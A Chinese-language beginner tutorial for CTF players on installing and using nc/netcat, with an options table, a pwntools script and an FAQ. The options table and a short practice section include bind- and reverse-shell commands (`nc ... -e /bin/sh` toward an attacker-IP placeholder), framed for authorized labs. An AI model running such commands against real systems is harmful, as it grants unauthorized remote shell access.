# How to Use nc

### 什么是`nc`？为什么要用`nc`？浏览器怎么你了？
**TL;DR:** nc 是一个用来连接题目的工具，这些题目只能用 nc 或者其他类似的工具连接，浏览器打不开，不是环境坏了

nc/ncat 是一个命令行网络工具[^1]，允许你通过 [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) 协议或者 [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) 协议连接到远程服务器 [Socket](https://en.wikipedia.org/wiki/Network_socket)，并进行数据传输。浏览器使用的是 HTTP/HTTPS 协议。HTTP/HTTPS 协议构建于 TCP 协议之上，**而很多题目（Pwn / Misc）方向的题目使用的是原始的 TCP 协议**，并没有进一步实现 HTTP 协议的内容，所以用浏览器访问会显示一个服务器发送了无效的响应，此时的你可能以为环境出了问题，于是开始联系出题人，但是实际上环境没有问题，有问题的是你的工具！

你可能还会看到`netcat`这个名字，实际上`nc`就是`netcat`，而`ncat`是对`nc`的一个重写，两者间的行为差别可以忽略不计。（但无论何时，当你遇到问题求助他人时，请务必说明你使用的是哪个版本以及具体版本号）

当然，你如果不想使用命令行工具，你也可以使用`pwntools`之类的工具来访问此类题目，本文不进行详细说明。

### 如何安装`nc`？
我们建议你在 **[Linux](https://en.wikipedia.org/wiki/Linux)/[WSL](https://en.wikipedia.org/wiki/Windows_Subsystem_for_Linux)** 下进行这部分的解题操作。

大多数 [Linux 发行版](https://en.wikipedia.org/wiki/Linux_distribution)和 macOS 一般自带`nc`工具，可以在终端输入`nc`来判断是否已经安装`nc`工具，如果能正确显示nc的使用帮助，则说明已经正确安装，可以快进到下一部分。本文只说明如何在 Linux/Windows 下安装并使用`nc`，其他操作系统的安装方式请自行搜索。

**本文不解答任何因为网络原因(~~墙墙~~)导致的安装失败问题，请自行搜索使用镜像站或者其他手段！**

### Linux / WSL
不同 Linux 发行版使用不同的包管理器，也因此有不同的包名，和不同的安装命令。本部分仅考虑本文发布时最新LTS或者当前最新稳定版本（对于滚动发行版）

**使用系统包管理器**

对于使用 APT (Debian / Ubuntu / Kali Linux) 作为包管理器的发行版，请在终端中输入：
>sudo apt install -y netcat-openbsd

对于使用 DNF (Fedora) 作为包管理器的发行版，请在终端中输入：

>sudo dnf install -y nmap-ncat

对于使用 Pacman (Arch Linux / Black Arch)，请在终端中输入：

>sudo pacman -S openbsd-netcat

### Windows
Windows 上的`ncat`与`nmap`一起发行，因此你需要安装`nmap`工具。进入[nmap下载地址](https://nmap.org/download#windows)，找到**Latest stable release self-installer: nmap-x.xx-setup.exe**，下载并安装，即可在命令行中使用。注意：如果你使用这种方式安装，请将下面命令中的`nc`替换为为`ncat`

### 如何使用nc？
以下演示以 Linux 为主，Windows 用户需要把`nc`替换为`ncat`。

命令的基本格式是`nc [options] <hostname> <port>`，其中`<hostname>`是要访问的主机名，`<port>`为端口号。端口号可以在平台界面上找到。

示例：在平台上打开容器，平台报告IP为127.0.0.1端口号为10721，那么你可以使用以下命令来连接到题目：

>nc 127.0.0.1 10721

---

## 补充：nc 常用选项速查

连接题目只需要 `nc host port`，但了解这些选项能让你用得更顺手：

| 选项 | 作用 | 示例 |
|---|---|---|
| `-v` | 详细输出（显示连接成功与否） | `nc -v host port` |
| `-n` | 不做 DNS 解析（连 IP 时更快） | `nc -nv host port` |
| `-w 秒数` | 连接/空闲超时 | `nc -w 5 host port` |
| `-u` | 使用 UDP 协议 | `nc -u host port` |
| `-l` | 进入**监听**模式（等别人连你） | `nc -lvnp 4444` |
| `-p 端口` | 指定本地源端口 | `nc -lvnp 4444` |
| `-z` | 端口扫描模式（不发送数据） | `nc -z -v host 1-1000` |
| `-e 程序` | 连接后执行程序（如绑定 shell） | `nc -lvnp 4444 -e /bin/sh` |

> `-lvnp` 是最常用的命令：`l`=监听、`v`=详细、`n`=不解析、`p`=指定端口
> 
## 自己造一个"题目"来练手（监听模式）

没题目的时候可以自己开一个监听端口，模拟服务端：

**终端 A（扮演服务端）：**
```bash
nc -lvnp 4444
```

**终端 B（扮演客户端）：**
```bash
nc 127.0.0.1 4444
```

现在 A 里输入什么，B 就能收到什么，反之亦然——这就是一个最简单的 TCP 双向聊天。CTF 里"连上就有 flag"的题目，本质就是这台"服务端"在等你输入。

**反弹 shell 示例（仅限自己的靶机/虚拟机练习）：**
攻击机执行 `nc -lvnp 4444`，靶机执行 `nc 攻击机IP 4444 -e /bin/sh`，攻击机就拿到靶机的 shell。

**只在授权环境里玩这个，别拿室友电脑试（**

## 补充：自动化交互——echo 与 pwntools

题目让你"输入 1 再输入 2"，手动敲没问题；但让你"爆破 4 位密码"，手就废了，这时候要自动化。

**最朴素的方式：管道输入**
```bash
echo "1" | nc 127.0.0.1 10721
```

**用 pwntools 写交互脚本**（Python，`pip install pwntools`）：

```python
from pwn import *

io = remote("127.0.0.1", 10721)   # 连接题目

io.recvuntil(b"Please input:")    # 等服务端输出提示
io.sendline(b"1")                 # 发送输入（注意是 bytes）
io.recvuntil(b"flag{")            # 等到 flag 出现
flag = b"flag{" + io.recvline()   # 接收 flag 剩余部分

print(flag)
io.close()
```

常用方法：`recvuntil`（收到指定内容为止）、`recvline`（收一行）、`sendline`（发一行）、`interactive`（把控制权交给你手动操作）。

> Windows 用户注意：pwntools 官方只支持 Linux/WSL，所以装个 WSL或者Linux虚拟机 真的很有用（详见新生指北的 Linux 章节）。

## 实战演练流程

拿到一个"nc 题目"后，标准操作顺序：

1. **连**：`nc -nv 目标IP 端口`，先看它输出什么
2. **读**：把输出完整读一遍，题目要求往往就写在第一屏（别急着乱输入）
3. **试**：按提示交互；需要输入就先试直觉答案
4. **查**：卡住了，把输出内容和"题目类型"（Misc/Pwn）告诉搜索引擎或群友
5. **自动化**：重复操作多/要爆破时，上 pwntools 脚本

## 常见问题

### Q：连接不上，报 `Connection refused`？
### A
>容器没启动/已过期，或端口填错。回平台重新打开容器，核对 IP 和端口。

### Q：连接成功但没反应？
### A
>有的题目要先等它输出；有的需要你先输入。用 `-v` 确认连接状态，再耐心等 1~2 秒。

### Q：连上了，中文乱码？
### A
>题目输出一般是 ASCII/UTF-8，乱码多为终端编码问题。Windows 终端执行 `chcp 65001` 切 UTF-8。

### Q：怎么退出 nc？
### A
>`Ctrl + C` 直接断开；有的连接需要先输入 `exit` 或 `quit` 让服务端关闭。

### Q：nc 和 ncat 到底用哪个？
### A
>Linux 里用 `nc`，Windows（nmap 安装的）用 `ncat`，行为几乎一样。求助时说明你用的是哪个。

[^1]: [Wikipedia: Netcat](https://en.wikipedia.org/wiki/Netcat)
